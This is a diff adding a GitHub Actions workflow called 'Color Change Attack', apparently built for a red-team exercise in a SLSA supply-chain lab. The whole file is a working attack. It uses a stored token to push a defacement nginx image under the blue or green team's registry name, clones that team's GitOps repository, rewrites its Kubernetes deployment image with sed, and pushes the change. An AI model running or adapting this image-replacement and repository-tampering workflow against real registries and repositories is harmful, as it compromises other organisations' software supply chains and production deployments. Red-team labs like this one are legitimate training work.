@@ -1,0 +1,155 @@
+name: "Color Change Attack"
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_team:
+        description: 'Target team (blue/green)'
+        required: true
+        default: 'blue'
+        type: choice
+        options:
+          - blue
+          - green
+      target_color:
+        description: 'Change color to'
+        required: true
+        default: 'red'
+        type: choice
+        options:
+          - red
+
+permissions:
+  contents: write
+  id-token: write
+  packages: write
+
+jobs:
+  color_attack:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup target repository
+        id: setup
+        run: |
+          case "${{ github.event.inputs.target_team }}" in
+            "blue")
+              echo "target_repo=slsa-lab-blue/application" >> $GITHUB_OUTPUT
+              echo "image_name=ghcr.io/slsa-lab-blue/application" >> $GITHUB_OUTPUT
+              echo "deployment_file=k8s/deployment.yaml" >> $GITHUB_OUTPUT
+              ;;
+            "green")
+              echo "target_repo=slsa-lab-green/application" >> $GITHUB_OUTPUT
+              echo "image_name=ghcr.io/slsa-lab-green/application" >> $GITHUB_OUTPUT
+              echo "deployment_file=k8s/deployment-recovery.yaml" >> $GITHUB_OUTPUT
+              ;;
+          esac
+
+      - name: Set up buildx
+        uses: docker/setup-buildx-action@v3
+
+      - name: Login to GHCR
+        uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.G_TOKEN }}
+
+      - name: Create color-changed image
+        run: |
+          cat > Dockerfile.color << 'EOF'
+          FROM nginx:alpine
+          
+          # 색상 변경된 웹 페이지 생성
+          RUN echo '<!DOCTYPE html>' > /usr/share/nginx/html/index.html && \
+              echo '<html><head><title>Compromised by Red Team</title></head>' >> /usr/share/nginx/html/index.html && \
+              echo '<body style="background-color: ${{ github.event.inputs.target_color }}; color: white; text-align: center; padding-top: 200px;">' >> /usr/share/nginx/html/index.html && \
+              echo '<h1>🚨 COMPROMISED by RED TEAM 🚨</h1>' >> /usr/share/nginx/html/index.html && \
+              echo '<h2>Color changed to: ${{ github.event.inputs.target_color }}</h2>' >> /usr/share/nginx/html/index.html && \
+              echo '<p>Original team: ${{ github.event.inputs.target_team }}</p>' >> /usr/share/nginx/html/index.html && \
+              echo '<p>Attack time: '$(date)' </p>' >> /usr/share/nginx/html/index.html && \
+              echo '</body></html>' >> /usr/share/nginx/html/index.html
+          
+          EXPOSE 80
+          CMD ["nginx", "-g", "daemon off;"]
+          EOF
+
+      - name: Build and push color-changed image
+        uses: docker/build-push-action@v6
+        id: build
+        with:
+          context: .
+          file: Dockerfile.color
+          push: true
+          tags: |
+            ${{ steps.setup.outputs.image_name }}:${{ github.event.inputs.target_color }}-attack
+            ${{ steps.setup.outputs.image_name }}:sha-${{ github.sha }}
+          build-args: |
+            TEAM=red-team-attack
+            COLOR=${{ github.event.inputs.target_color }}
+
+      - name: Clone target repository
+        env:
+          GH_TOKEN: ${{ secrets.G_TOKEN }}
+        run: |
+          git clone https://github.com/${{ steps.setup.outputs.target_repo }}.git target_repo
+          cd target_repo
+          git config user.name "red-team-attack"
+          git config user.email "attack@red-team.com"
+
+      - name: Modify deployment with new color image
+        run: |
+          cd target_repo
+          
+          # Blue Team 공격 - deployment.yaml 수정
+          if [ "${{ github.event.inputs.target_team }}" == "blue" ]; then
+            sed -i "s|image: .*|image: ${{ steps.setup.outputs.image_name }}:${{ github.event.inputs.target_color }}-attack|" k8s/deployment.yaml
+            
+            # 추가로 색상 환경변수 주입
+            if ! grep -q "TEAM_COLOR" k8s/deployment.yaml; then
+              sed -i '/ports:/i\
+                  env:\
+                    - name: TEAM_COLOR\
+                      value: "${{ github.event.inputs.target_color }}"' k8s/deployment.yaml
+            else
+              sed -i "s|value: .*|value: \"${{ github.event.inputs.target_color }}\"|" k8s/deployment.yaml
+            fi
+          fi
+          
+          # Green Team 공격 - deployment-recovery.yaml 수정
+          if [ "${{ github.event.inputs.target_team }}" == "green" ]; then
+            sed -i "s|image: .*|image: ${{ steps.setup.outputs.image_name }}:${{ github.event.inputs.target_color }}-attack|" k8s/deployment-recovery.yaml
+            
+            # 보안 컨텍스트는 유지하되 이미지만 교체
+            if ! grep -q "TEAM_COLOR" k8s/deployment-recovery.yaml; then
+              sed -i '/ports:/i\
+                  env:\
+                    - name: TEAM_COLOR\
+                      value: "${{ github.event.inputs.target_color }}"' k8s/deployment-recovery.yaml
+            else
+              sed -i "s|value: .*|value: \"${{ github.event.inputs.target_color }}\"|" k8s/deployment-recovery.yaml
+            fi
+          fi
+          
+          git add .
+          git commit -m "🚨 Color attack: Changed to ${{ github.event.inputs.target_color }} by Red Team"
+          git push
+
+      - name: Attack summary
+        run: |
+          echo "🎯 Color Change Attack Completed!"
+          echo "================================="
+          echo "Target Team: ${{ github.event.inputs.target_team }}"
+          echo "Color Changed To: ${{ github.event.inputs.target_color }}"
+          echo "Image: ${{ steps.setup.outputs.image_name }}:${{ github.event.inputs.target_color }}-attack"
+          echo ""
+          echo "✅ Attack Vector: Supply Chain Image Replacement"
+          echo "✅ Method: GitOps Repository Compromise"
+          echo "✅ Result: Team color successfully changed!"
+          echo ""
+          echo "🔍 The target team's application will now display:"
+          echo "   - Background: ${{ github.event.inputs.target_color }}"
+          echo "   - Message: 'COMPROMISED by RED TEAM'"
+          echo "   - Original team identity overwritten"
